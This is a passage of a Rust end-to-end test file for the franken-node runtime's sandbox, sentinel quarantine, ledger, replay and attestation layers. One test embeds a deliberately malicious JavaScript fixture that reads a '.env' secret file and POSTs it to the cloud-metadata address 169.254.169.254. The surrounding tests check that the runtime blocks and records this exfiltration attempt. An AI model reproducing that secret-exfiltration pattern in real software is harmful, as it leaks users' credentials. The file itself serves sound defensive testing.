        record["schema_version"],
        json!("franken-node/sentinel-quarantine-record/v1")
    );
    assert_eq!(record["released"], json!(false));
    assert_eq!(record["decision_id"], json!(&decision_id));
    assert!(
        record["escalation_receipt"].is_object(),
        "record must embed the signed FN-SENTINEL-008 escalation receipt"
    );
    let run_events = structured_events(&run.stderr);
    assert_event_order(
        &run_events,
        &["FN-SENTINEL-008", "FN-SENTINEL-009"],
        trace_id,
    );
    layer_pass(
        "L7 ENFORCE escalation → subject quarantine record",
        &format!("decision={decision_id} FN-SENTINEL-009 on trace"),
    );

    // Fail-closed rerun: the preflight refuses the quarantined subject in
    // every policy mode and names the exact release command.
    let blocked = Command::new(franken_node_bin())
        .current_dir(workspace)
        .args([
            "run",
            "app.js",
            "--policy",
            "legacy-risky",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
            "--json",
            "--trace-id",
            trace_id,
        ])
        .output()
        .expect("spawn blocked rerun");
    assert!(
        !blocked.status.success(),
        "rerun of a sentinel-quarantined app must fail closed; stdout:\n{}",
        String::from_utf8_lossy(&blocked.stdout)
    );
    // With --json the blocked preflight verdict is the stdout report (no
    // second human error on stderr), so the reason is read from it.
    let blocked_report: Value = serde_json::from_slice(&blocked.stdout)
        .expect("blocked --json rerun must print the preflight verdict JSON");
    let violations = blocked_report["verdict"]["violations"]
        .as_array()
        .expect("blocked verdict lists violations");
    assert!(
        violations
            .iter()
            .any(|violation| violation["kind"] == "sentinel_quarantined"),
        "block must be the typed sentinel quarantine: {blocked_report}"
    );
    let blocked_reason = blocked_report["verdict"].to_string();
    assert!(
        blocked_reason.contains("quarantined by the Runtime Sentinel"),
        "block reason must name the sentinel quarantine: {blocked_report}"
    );
    assert!(
        blocked_reason.contains("trust release"),
        "block reason must name the release command: {blocked_report}"
    );
    layer_pass(
        "L7 ENFORCE rerun blocked at preflight",
        "exit!=0, reason names sentinel quarantine + release command",
    );

    // The same real, quarantined bytes remain blocked when selected through a
    // directory's package main. Hashing the directory itself used to skip this
    // gate, even though the file invocation immediately above was refused.
    std::fs::write(workspace.join("package.json"), r#"{"main":"app.js"}"#)
        .expect("select quarantined entrypoint as package main");
    let directory_blocked = run_cli(
        workspace,
        &[
            "run",
            ".",
            "--policy",
            "legacy-risky",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
            "--json",
        ],
    );
    assert!(!directory_blocked.status.success());
    let directory_report: Value = serde_json::from_slice(&directory_blocked.stdout)
        .expect("directory invocation emits blocked preflight JSON");
    assert!(
        directory_report["verdict"]["violations"]
            .as_array()
            .expect("directory preflight violations")
            .iter()
            .any(|violation| violation["kind"] == "sentinel_quarantined"),
        "directory invocation must consult the same active subject quarantine: {directory_report}"
    );
    assert_eq!(directory_report["receipt"]["decision"], json!("denied"));

    // Audited operator release, then the subject runs again.
    let release = run_cli(
        workspace,
        &[
            "trust",
            "release",
            "--app",
            ".",
            "--operator-id",
            "tnr-e2e-operator",
            "--reason",
            "containment remediated in e2e",
            "--json",
        ],
    );
    assert!(
        release.status.success(),
        "trust release failed: {}",
        String::from_utf8_lossy(&release.stderr)
    );
    let release_stdout = String::from_utf8_lossy(&release.stdout);
    let release_json: Value = serde_json::from_str(release_stdout.trim()).unwrap_or_else(|err| {
        panic!("trust release --json must emit JSON ({err}):\n{release_stdout}")
    });
    assert_eq!(
        release_json["schema_version"],
        json!("franken-node/trust-release-cli/v1")
    );
    assert_eq!(release_json["decision_id"], json!(&decision_id));
    let released: Value =
        serde_json::from_str(&std::fs::read_to_string(&record_path).expect("re-read record"))
            .expect("released record is canonical JSON");
    assert_eq!(released["released"], json!(true));
    assert_eq!(released["release_operator"], json!("tnr-e2e-operator"));
    layer_pass(
        "L7 ENFORCE trust release lifts quarantine",
        "released=true with audited operator entry",
    );

    let rerun = run_app(workspace, trace_id, "legacy-risky");
    assert_eq!(
        rerun.exit_code,
        Some(0),
        "released subject must run again; stderr:\n{}",
        rerun.stderr
    );
    let rerun_enforcement = &rerun.report["receipt"]["sentinel_enforcement"];
    assert_eq!(rerun_enforcement["mode"], json!("enforced"));
    assert_eq!(
        rerun_enforcement["quarantine_record_preexisting"],
        json!(false),
        "a released record must be superseded by a fresh quarantine, not reused"
    );
    let requarantined: Value = serde_json::from_str(
        &std::fs::read_to_string(&record_path).expect("re-read record after rerun"),
    )
    .expect("re-quarantined record is canonical JSON");
    assert_eq!(requarantined["released"], json!(false));
    layer_pass(
        "L7 ENFORCE re-escalation re-quarantines after release",
        "record active again with fresh decision",
    );
}

/// The clean pipeline: fs write + fs read + allowed loopback http egress,
/// every layer green, all under one trace id.
#[test]
fn tnr_full_pipeline_clean_run_single_trace_id() {
    // A real loopback sink observes the guest's egress (bound before the run
    // so the connect always finds it listening).
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind loopback sink");
    let addr = listener.local_addr().expect("listener addr");
    let server = std::thread::spawn(move || {
        let (mut stream, _peer) = listener.accept().expect("accept guest egress");
        stream
            .set_read_timeout(Some(Duration::from_secs(10)))
            .expect("read timeout");
        let mut received = Vec::new();
        let _ = stream.read_to_end(&mut received);
        let _ = stream.write_all(
            b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 2\r\n\r\nok",
        );
        let _ = stream.flush();
        received
    });

    let app = format!(
        "const fs = require('fs');\n\
         fs.writeFileSync('out.txt', 'tnr-pipeline-payload');\n\
         const data = fs.readFileSync('out.txt');\n\
         console.log('tnr-payload-bytes', data.length);\n\
         require('http').get('http://{addr}/');\n"
    );
    let workspace = bootstrap_workspace(&app, "legacy-risky");
    let run = run_app(workspace.path(), CLEAN_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: real execution, real side effects, verdict-derived exit.
    assert_eq!(
        run.exit_code,
        Some(0),
        "clean run must exit 0 (containment Allow); stderr:\n{}",
        run.stderr
    );
    assert_eq!(run.report["success"], json!(true));
    assert_eq!(run.report["dispatch"]["exit_code"], json!(0));
    let written = std::fs::read_to_string(workspace.path().join("out.txt"))
        .expect("guest fs.writeFileSync must produce real bytes on disk");
    assert_eq!(written, "tnr-pipeline-payload");
    let guest_stdout = run.report["dispatch"]["captured_output"]["stdout"]
        .as_str()
        .expect("captured stdout");
    assert!(
        guest_stdout.contains("tnr-payload-bytes 20"),
        "guest console output must surface the real read-back length: {guest_stdout:?}"
    );
    let receipt_path = run.report["receipt_path"].as_str().expect("receipt_path");
    assert!(
        workspace.path().join(receipt_path).is_file() || Path::new(receipt_path).is_file(),
        "run execution receipt must persist at {receipt_path}"
    );
    layer_pass(
        "L1 RUN real app under native engine",
        "exit=0, fs bytes on disk, console captured, receipt persisted",
    );

    // The loopback sink really observed the engine-framed request.
    let received = server.join().expect("server thread");
    let wire = String::from_utf8_lossy(&received);
    assert!(
        wire.starts_with("GET / HTTP/1.1\r\n"),
        "loopback sink must observe the engine-framed GET, got {wire:?}"
    );
    layer_pass("L1 RUN loopback sink observed egress", "GET / HTTP/1.1");

    // ---- L2 EFFECT: signed host-effect ledger with tamper-evident chain.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(
        !ledger.is_null(),
        "native run must surface the host-effect ledger"
    );
    assert_eq!(ledger["schema_version"], json!("host-effect-ledger-v3.0"));
    assert!(
        ledger["signature"].is_object(),
        "the host-effect ledger must carry its runtime-evidence signature envelope"
    );
    let kinds: Vec<&str> = ledger["entries"]
        .as_array()
        .expect("entries")
        .iter()
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        kinds.contains(&"fs_write")
            && kinds.contains(&"fs_read")
            && kinds.contains(&"http_request"),
        "ledger must carry all three host crossings, got {kinds:?}"
    );
    assert_eq!(
        ledger["allowed_count"], ledger["effect_count"],
        "clean run: every effect allowed"
    );
    assert_eq!(ledger["denied_count"], json!(0));
    let chain_head = ledger["chain_head_hash"].as_str().expect("chain head");
    assert!(chain_head.starts_with("sha256:"));
    layer_pass(
        "L2 EFFECT signed host-effect ledger",
        &format!("effects={} kinds={kinds:?}", ledger["effect_count"]),
    );

    // ---- L2.75 SENTINEL (bd-bg2hy): the dispatcher feeds the Bayesian
    // Runtime Sentinel from the signed ledger. A clean run is neutral
    // evidence: the anytime-valid e-value stays at 1.0, the expected-loss
    // action is Allow, and no escalation receipt is signed.
    let sentinel = &run.report["dispatch"]["sentinel"];
    assert!(
        !sentinel.is_null(),
        "native run must surface the sentinel report"
    );
    assert_eq!(
        sentinel["schema_version"],
        json!("runtime_sentinel.run_report.v1")
    );
    assert_eq!(
        sentinel["e_value_ppm"],
        json!(1_000_000),
        "clean evidence is exactly neutral: {sentinel}"
    );
    assert_eq!(sentinel["decision"]["selected_action"], json!("allow"));
    assert_eq!(sentinel["escalated"], json!(false));
    assert!(
        sentinel["escalation_receipt"].is_null(),
        "no escalation receipt on a clean run"
    );
    assert_eq!(
        sentinel["e_process_updates"]
            .as_array()
            .expect("e_process_updates")
            .len() as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one e-process update per ledger entry"
    );
    layer_pass(
        "L2.75 SENTINEL fed from ledger (clean)",
        "e_value=1.0, action=allow, escalated=false",
    );
    // bd-fp1je: enforcement only fires on escalation; a clean run must not
    // carry an enforcement summary even with quarantine_on_high_risk=true.
    assert!(
        run.report["receipt"]["sentinel_enforcement"].is_null(),
        "a clean run must not trigger sentinel enforcement: {}",
        run.report["receipt"]["sentinel_enforcement"]
    );

    // ---- L3 LOG: ordered event codes, one trace id across the stream. The
    // host crossings surface as registered FN-EFFECT-002 events (bd-ihtox),
    // one per ledger entry, between dispatch (RUN-003) and receipt (RUN-004);
    // the sentinel feed surfaces as FN-SENTINEL-001/002/007 (bd-bg2hy).
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &[
            "RUN-001",
            "RUN-003",
            "FN-EFFECT-002",
            "FN-SENTINEL-001",
            "FN-SENTINEL-002",
            "FN-SENTINEL-007",
            "RUN-004",
        ],
        CLEAN_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry"
    );
    let sentinel_updates = events
        .iter()
        .filter(|(code, _)| code == "FN-SENTINEL-002")
        .count();
    assert_eq!(
        sentinel_updates as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-SENTINEL-002 e-process update per ledger entry"
    );
    assert!(
        !events.iter().any(|(code, _)| code == "FN-SENTINEL-008"),
        "a clean run must not emit an escalation receipt event"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002/FN-SENTINEL-* events, single trace id",
        &format!("events={} effect_events={effect_events}", events.len()),
    );

    // ---- L5 VSDK: offline re-derivation (before replay so the auditor's
    // view is independent of the incident chain).
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY: bundle → replay → counterfactual over the run's
    // receipts through the real CLI. A clean run is not an incident, so
    // nothing was captured and the harness assembles the evidence.
    let captured = captured_incident_id(&ledger);
    assert!(
        !workspace
            .path()
            .join(".franken-node/state/incidents")
            .join(&captured)
            .exists(),
        "a clean run must not capture an incident ({captured})"
    );
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        "INC-TNR-CLEAN-0001",
        CLEAN_TRACE_ID,
        IncidentEvidence::AssembledFromLedger(&ledger),
    );

    // ---- L6 LTV: CLI attest + offline SDK verify over chain + bundle.
    ltv_leg(
        workspace.path(),
        &run.report,
        "INC-TNR-CLEAN-0001.fnbundle",
        &bundle_integrity_hash,
        CLEAN_TRACE_ID,
    );

    println!(
        "[TNR-E2E] ================ CLEAN PIPELINE: ALL LAYERS PASS (trace_id={CLEAN_TRACE_ID})"
    );
}

/// The contained variant: the guest reads a recognized secret file (`.env`)
/// and attempts to exfiltrate its contents by POSTing them to the
/// cloud-metadata endpoint. Three layered controls fire: the SSRF egress gate
/// denies that endpoint BEFORE any socket opens, the information-flow lane
/// (bd-plhag) recognizes that the denied egress carries the secret's bytes and
/// records it as a flow BLOCK, and the Bayesian Runtime Sentinel (bd-bg2hy)
/// compounds the evidence into a real containment-ladder escalation with a
/// signed FN-SENTINEL-008 receipt carrying the e-value. The denial is surfaced
/// in the signed ledger (not masked by the exit code); the verifier SDK then
/// proves OFFLINE that the forbidden label was blocked before the sink, and
/// the full downstream pipeline — replay, counterfactual, LTV — runs over
/// that evidence.
#[test]
fn tnr_full_pipeline_denied_exfil_variant_contained() {
    let app = "const fs = require('fs');\n\
               const secret = fs.readFileSync('.env', 'utf8');\n\
               console.log('classified-bytes', secret.length);\n\
               const req = require('http').request('http://169.254.169.254/exfil', { method: 'POST' });\n\
               req.on('error', () => {});\n\
               req.end(secret);\n";
    let workspace = bootstrap_workspace(app, "legacy-risky");
    std::fs::write(
        workspace.path().join(".env"),
        "TNR_FAKE_SECRET=not-a-real-secret-e2e-fixture-abcdef0123456789\n",
    )
    .expect("write fixture secret");

    let run = run_app(workspace.path(), EXFIL_TRACE_ID, "legacy-risky");

    // ---- L1 RUN: denial is containment-neutral for the ENGINE verdict
    // (Allow → exit 0); the fail-closed refusal happens pre-socket and lives
    // in the ledger. The product-side SENTINEL escalation asserted below is
    // operator-facing signed evidence, not the exit verdict.
    assert_eq!(
        run.exit_code,
        Some(0),
        "a single denied effect must not escalate engine containment; stderr:\n{}",
        run.stderr
    );
    layer_pass(
        "L1 RUN exfil variant executes under containment",
        "exit=0 (denial surfaced, not masked)",
    );

    // ---- L2 EFFECT: the read is allowed, the egress is denied, the chain
    // stays tamper-evident.
    let ledger = run.report["dispatch"]["host_effect_ledger"].clone();
    assert!(!ledger.is_null(), "ledger must be present");
    let denied = ledger["denied_count"].as_u64().expect("denied_count");
    assert!(
        denied >= 1,
        "the metadata egress must be refused fail-closed: {ledger}"
    );
    let entries = ledger["entries"].as_array().expect("entries");
    let denied_kinds: Vec<&str> = entries
        .iter()
        .filter(|entry| entry["receipt"]["policy_outcome"]["outcome"] != json!("allowed"))
        .map(|entry| entry["receipt"]["effect_kind"].as_str().expect("kind"))
        .collect();
    assert!(
        denied_kinds.contains(&"http_request"),
        "the denied crossing must be the exfil egress, got {denied_kinds:?} in {ledger}"
    );
    layer_pass(
        "L2 EFFECT exfil egress denied in signed ledger",
        &format!("denied_count={denied}"),
    );

    // ---- L2.5 FLOW (bd-plhag): the denied egress carries the secret's bytes,
    // so it is recorded as a flow BLOCK, and the verifier SDK proves offline
    // that the forbidden label was blocked before the sink.
    let secret_commitment =
        frankenengine_node::security::lineage_tracker::secret_file_label_set_commitment();
    let egress = entries
        .iter()
        .find(|entry| entry["receipt"]["effect_kind"] == json!("http_request"))
        .expect("http_request egress receipt");
    assert_eq!(
        egress["receipt"]["flow_policy_verdict"],
        json!("blocked"),
        "the denied secret egress must be a flow block: {egress}"
    );
    assert_eq!(
        egress["receipt"]["label_set_commitment"],
        json!(secret_commitment),
        "the egress must carry the secret label commitment"
    );
    // FN-FLOW-003 (sink blocked) is emitted for the blocked egress under the
    // pipeline trace id.
    let flow_events = structured_events(&run.stderr);
    assert_event_order(&flow_events, &["FN-FLOW-003"], EXFIL_TRACE_ID);
    // Offline non-exfiltration proof over the run's own ledger entries.
    let sdk_entries: Vec<frankenengine_verifier_sdk::bundle::EffectReceiptChainEntry> =
        serde_json::from_str(&serde_json::to_string(&ledger["entries"]).unwrap())
            .expect("verifier SDK accepts the ledger wire shape");
    let sdk = frankenengine_verifier_sdk::VerifierSdk::new("verifier://tnr-full-pipeline-exfil");
    let chain = sdk
        .verify_effect_chain_entries(&sdk_entries)
        .expect("effect chain re-derives offline");
    let claim = frankenengine_verifier_sdk::bundle::NonExfiltrationClaim {
        forbidden_label_set_commitments: vec![secret_commitment],
        external_sink_effect_kinds: vec!["http_request".to_string()],
        allowed_declassification_refs: vec![],
    };
    let non_exfil =
        frankenengine_verifier_sdk::bundle::verify_non_exfiltration_claim_in_report(&chain, &claim)
            .expect("non-exfiltration claim verifies: the secret was blocked before the sink");
    assert!(
        non_exfil
            .examined_effects
            .iter()
            .any(|e| e.effect_kind == "http_request" && e.proof_outcome == "blocked_before_sink"),
        "the SDK must classify the blocked secret egress as blocked_before_sink"
    );
    layer_pass(
        "L2.5 FLOW secret egress blocked + non-exfiltration proven",
        "flow_policy_verdict=blocked, SDK=blocked_before_sink",
    );

    // ---- L2.75 SENTINEL (bd-bg2hy): the planted-malicious workload drives a
    // REAL escalation. The sensitive `.env` read (likelihood ratio 1.5×) and
    // the blocked secret egress (500×) compound to an e-value of exactly 750:
    // the anytime-valid false-alarm bound (1/750 ≈ 0.13%) falls below alpha
    // (1%) and the expected-loss ladder selects quarantine. The escalation is
    // a SIGNED evidence entry carrying the e-value, verified OFFLINE here
    // against the run's surfaced verifying key.
    let sentinel = &run.report["dispatch"]["sentinel"];
    assert!(!sentinel.is_null(), "sentinel report must be present");
    assert_eq!(
        sentinel["e_value_ppm"],
        json!(750_000_000_u64),
        "sensitive read (1.5) × blocked exfil (500) = e 750: {sentinel}"
    );
    assert_eq!(sentinel["posterior_malice_bp"], json!(8_833));
    assert_eq!(
        sentinel["decision"]["selected_action"],
        json!("quarantine"),
        "expected-loss ladder must select quarantine for the exfil run"
    );
    assert_eq!(sentinel["escalated"], json!(true));
    let receipt_entry: frankenengine_node::observability::evidence_ledger::EvidenceEntry =
        serde_json::from_value(sentinel["escalation_receipt"].clone())
            .expect("escalation receipt deserializes as an evidence entry");
    let vk_hex = sentinel["escalation_verifying_key_hex"]
        .as_str()
        .expect("escalation verifying key surfaced");
    let vk_bytes: [u8; 32] = hex::decode(vk_hex)
        .expect("verifying key hex decodes")
        .try_into()
        .expect("verifying key is 32 bytes");
    let verifying_key =
        ed25519_dalek::VerifyingKey::from_bytes(&vk_bytes).expect("valid Ed25519 key");
    frankenengine_node::observability::evidence_ledger::verify_evidence_entry(
        &receipt_entry,
        &verifying_key,
    )
    .expect("escalation receipt signature verifies offline");
    assert_eq!(
        receipt_entry.payload["event_code"],
        json!("FN-SENTINEL-008")
    );
    assert_eq!(
        receipt_entry.payload["decision"]["e_value_ppm"],
        json!(750_000_000_u64),
        "the signed escalation receipt carries the e-value"
    );
    // The receipt is bound to its SOURCE ledger's trace id (the engine-side
    // workflow trace, same id the effect receipts carry) — internal
    // consistency, not the CLI --trace-id. Correlation to the CLI trace id is
    // the FN-SENTINEL-008 structured-log event asserted below.
    assert_eq!(
        ledger["trace_id"],
        json!(receipt_entry.trace_id),
        "escalation receipt must be bound to the ledger's workflow trace"
    );
    assert_eq!(sentinel["trace_id"], json!(receipt_entry.trace_id));
    layer_pass(
        "L2.75 SENTINEL escalation on planted-malicious run",
        "e_value=750, action=quarantine, FN-SENTINEL-008 receipt verified offline",
    );

    // ---- L3 LOG: same ordered contract, exfil trace id; the denied
    // crossing surfaces as an FN-EFFECT-002 event too (denial is evidence),
    // and the sentinel escalation surfaces as FN-SENTINEL-008.
    let events = structured_events(&run.stderr);
    assert_event_order(
        &events,
        &[
            "RUN-001",
            "RUN-003",
            "FN-EFFECT-002",
            "FN-SENTINEL-001",
            "FN-SENTINEL-002",
            "FN-SENTINEL-007",
            "FN-SENTINEL-008",
            "RUN-004",
        ],
        EXFIL_TRACE_ID,
    );
    let effect_events = events
        .iter()
        .filter(|(code, _)| code == "FN-EFFECT-002")
        .count();
    assert_eq!(
        effect_events as u64,
        ledger["effect_count"].as_u64().expect("effect_count"),
        "one FN-EFFECT-002 event per ledger entry (denied included)"
    );
    layer_pass(
        "L3 LOG ordered RUN-*/FN-EFFECT-002 events, single trace id",
        &format!("effect_events={effect_events}"),
    );

    // ---- L5 VSDK: the denial chain re-derives offline too.
    verifier_sdk_leg(&ledger);

    // ---- L4 REPLAY + L6 LTV over the denial evidence `run` captured itself.
    let incident_id = captured_incident_id(&ledger);
    let bundle_integrity_hash = incident_chain_leg(
        workspace.path(),
        &incident_id,
        EXFIL_TRACE_ID,
        IncidentEvidence::CapturedByRun,
    );
    ltv_leg(
        workspace.path(),
        &run.report,
        &format!("{incident_id}.fnbundle"),
        &bundle_integrity_hash,
        EXFIL_TRACE_ID,
    );

    // ---- L7 ENFORCE (bd-fp1je): the escalation drives product-side
    // enforcement and the loop closes: quarantine -> blocked rerun ->
    // audited release -> re-quarantine on re-escalation.
    sentinel_enforcement_leg(workspace.path(), &run, EXFIL_TRACE_ID);

    println!(
        "[TNR-E2E] ================ EXFIL VARIANT: CONTAINED + ALL LAYERS PASS (trace_id={EXFIL_TRACE_ID})"
    );
}

/// The third enforcement arm, pinned so the pipeline's profile choice stays
/// honest: under `balanced` the ENGINE capability gate itself refuses
/// `fs:write` before the effect happens — a hard interpreter abort (non-zero
/// exit, no bytes on disk), not a ledger-surfaced denial. This is the
/// capability-metering layer the bead's vision calls "capability-accounted
/// runtime kernel"; the pipeline tests above run under `legacy-risky`
/// precisely because it grants these capabilities, moving the enforcement
/// boundary to the SSRF gate where denials become signed ledger receipts.
#[test]
fn tnr_engine_capability_gate_fails_closed_under_balanced() {
    let app = "const fs = require('fs');\n\
               fs.writeFileSync('out.txt', 'must-never-land');\n";
    let workspace = bootstrap_workspace(app, "balanced");
    let run_output = Command::new(franken_node_bin())
        .current_dir(workspace.path())
        .args([
            "run",
            "app.js",
            "--policy",
            "balanced",
            "--runtime",
            "franken-engine",
            "--engine-bin",
            franken_node_bin(),
        ])
        .output()
        .expect("spawn franken-node run");

    assert!(
        !run_output.status.success(),
        "balanced must refuse the ungranted fs:write capability fail-closed"
    );
    let stderr = String::from_utf8_lossy(&run_output.stderr);
    assert!(
        stderr.contains("capability denied: fs:write"),
        "the refusal must name the denied capability, got:\n{stderr}"
    );
    assert!(
        !workspace.path().join("out.txt").exists(),
        "no bytes may land on disk after a capability refusal"
    );
    layer_pass(
        "L1 RUN engine capability gate (balanced)",
        "fs:write refused pre-effect, non-zero exit, no bytes on disk",
    );
}

#[test]
fn ltv_attest_json_fails_closed_when_bundle_missing() {
    let workspace = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(
        workspace.path().join("franken_node.toml"),
        "profile = \"balanced\"\n\n[trust]\nregistry_signing_key = \"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"\n\n[security]\nauthorized_api_keys = [\"fnode-e2e-ltv-cli-key\"]\n",
    )
    .expect("write fail-closed config");
    let output = run_cli(
        workspace.path(),
        &[
            "ltv",
            "attest",
            "--bundle",
            "missing.fnbundle",
            "--out",
            "ltv-evidence.json",
            "--json",
        ],
    );
    assert!(
        !output.status.success(),
        "ltv attest --json should fail when the bundle is missing"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("ltv attest --json missing-bundle stdout must be JSON ({err}):\n{stdout}")
    });
    assert_eq!(payload["schema_version"], "franken-node/ltv-error-cli/v1");
    assert_eq!(payload["command"], "ltv.attest");
    assert_eq!(payload["ok"], false);
    let error = payload["error"].as_str().unwrap_or_default();
    assert!(
        error.contains("failed reading replay bundle") || error.contains("missing.fnbundle"),
        "missing-bundle --json must name the bundle failure: {payload}"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("Error: failed reading replay bundle"),
        "--json must not append a second human Error line after the JSON report: {stderr}"
    );
}

#[test]
fn ltv_attest_json_fails_closed_when_witness_key_missing() {
    let workspace = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(
        workspace.path().join("franken_node.toml"),
        "profile = \"balanced\"\n\n[trust]\nregistry_signing_key = \"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"\n\n[security]\nauthorized_api_keys = [\"fnode-e2e-ltv-cli-key\"]\n",
    )
    .expect("write fail-closed config");
    std::fs::write(
        workspace.path().join("present.fnbundle"),
        b"not-a-real-bundle",
    )
    .expect("write dummy bundle so the handler reaches the witness-key check");
    let output = run_cli(
        workspace.path(),
        &[
            "ltv",
            "attest",
            "--bundle",
            "present.fnbundle",
            "--out",
            "ltv-evidence.json",
            "--json",
        ],
    );
    assert!(
        !output.status.success(),
        "ltv attest --json should fail when --witness-key is omitted"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("ltv attest --json missing-witness-key stdout must be JSON ({err}):\n{stdout}")
    });
    assert_eq!(payload["schema_version"], "franken-node/ltv-error-cli/v1");
    assert_eq!(payload["command"], "ltv.attest");
    assert_eq!(payload["ok"], false);
    let error = payload["error"].as_str().unwrap_or_default();
    assert!(
        error.contains("witness-key") || error.contains("witness key"),
        "missing --witness-key --json must name the handler requirement: {payload}"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("error: the following required arguments were not provided")
            && !stderr.contains("Error: ltv attest requires at least one --witness-key"),
        "--json must not append a human clap/Error line after the JSON report: {stderr}"
    );
}

#[test]
fn ltv_attest_json_fails_closed_when_bundle_flag_missing() {
    let workspace = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(
        workspace.path().join("franken_node.toml"),
        "profile = \"balanced\"\n\n[trust]\nregistry_signing_key = \"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"\n\n[security]\nauthorized_api_keys = [\"fnode-e2e-ltv-cli-key\"]\n",
    )
    .expect("write fail-closed config");
    let output = run_cli(workspace.path(), &["ltv", "attest", "--json"]);
    assert!(
        !output.status.success(),
        "ltv attest --json should fail when --bundle is omitted"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("ltv attest --json missing --bundle stdout must be JSON ({err}):\n{stdout}")
    });
    assert_eq!(payload["schema_version"], "franken-node/ltv-error-cli/v1");
    assert_eq!(payload["command"], "ltv.attest");
    assert_eq!(payload["ok"], false);
    let error = payload["error"].as_str().unwrap_or_default();
    assert!(
        error.contains("--bundle"),
        "missing --bundle --json must name the handler requirement: {payload}"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("error: the following required arguments were not provided")
            && !stderr.contains("Error: --bundle"),
        "--json must not append a human clap/Error line after the JSON report: {stderr}"
    );
}

#[test]
fn ltv_attest_json_fails_closed_when_out_flag_missing() {
    let workspace = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(
        workspace.path().join("franken_node.toml"),
        "profile = \"balanced\"\n\n[trust]\nregistry_signing_key = \"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"\n\n[security]\nauthorized_api_keys = [\"fnode-e2e-ltv-cli-key\"]\n",
    )
    .expect("write fail-closed config");
    std::fs::write(
        workspace.path().join("present.fnbundle"),
        b"not-a-real-bundle",
    )
    .expect("write dummy bundle so the handler reaches the --out check");
    let output = run_cli(
        workspace.path(),
        &["ltv", "attest", "--bundle", "present.fnbundle", "--json"],
    );
    assert!(
        !output.status.success(),
        "ltv attest --json should fail when --out is omitted"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("ltv attest --json missing --out stdout must be JSON ({err}):\n{stdout}")
    });
    assert_eq!(payload["schema_version"], "franken-node/ltv-error-cli/v1");
    assert_eq!(payload["command"], "ltv.attest");
    assert_eq!(payload["ok"], false);
    let error = payload["error"].as_str().unwrap_or_default();
    assert!(
        error.contains("--out"),
        "missing --out --json must name the handler requirement: {payload}"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("error: the following required arguments were not provided")
            && !stderr.contains("Error: --out"),
        "--json must not append a human clap/Error line after the JSON report: {stderr}"
    );
}

#[test]
fn ltv_verify_as_of_json_fails_closed_when_evidence_flag_missing() {
    let workspace = tempfile::TempDir::new().expect("tempdir");
    std::fs::write(
        workspace.path().join("franken_node.toml"),
        "profile = \"balanced\"\n\n[trust]\nregistry_signing_key = \"QkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkI=\"\n\n[security]\nauthorized_api_keys = [\"fnode-e2e-ltv-cli-key\"]\n",
    )
    .expect("write fail-closed config");
    let output = run_cli(workspace.path(), &["ltv", "verify-as-of", "--json"]);
    assert!(
        !output.status.success(),
        "ltv verify-as-of --json should fail when --evidence is omitted"
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let payload: serde_json::Value = serde_json::from_str(&stdout).unwrap_or_else(|err| {
        panic!("ltv verify-as-of --json missing --evidence stdout must be JSON ({err}):\n{stdout}")
    });
    assert_eq!(payload["schema_version"], "franken-node/ltv-error-cli/v1");
    assert_eq!(payload["command"], "ltv.verify-as-of");
    assert_eq!(payload["ok"], false);
    let error = payload["error"].as_str().unwrap_or_default();
    assert!(
        error.contains("--evidence"),
        "missing --evidence --json must name the handler requirement: {payload}"
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        !stderr.contains("error: the following required arguments were not provided")
            && !stderr.contains("Error: --evidence"),
        "--json must not append a human clap/Error line after the JSON report: {stderr}"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn composed_operator_acceptance_scenario_end_to_end() {
    use chrono::Utc;
    use ed25519_dalek::{Signer, SigningKey, VerifyingKey};
    use frankenengine_node::control_plane::fleet_http_server::{
        FLEET_HTTP_LISTENING, FleetControlPlaneService, FleetHttpServerConfig,
        FleetHttpServerControl, FleetNodeCredentials, serve_fleet_control_plane,
    };
    use frankenengine_node::control_plane::fleet_transport::{
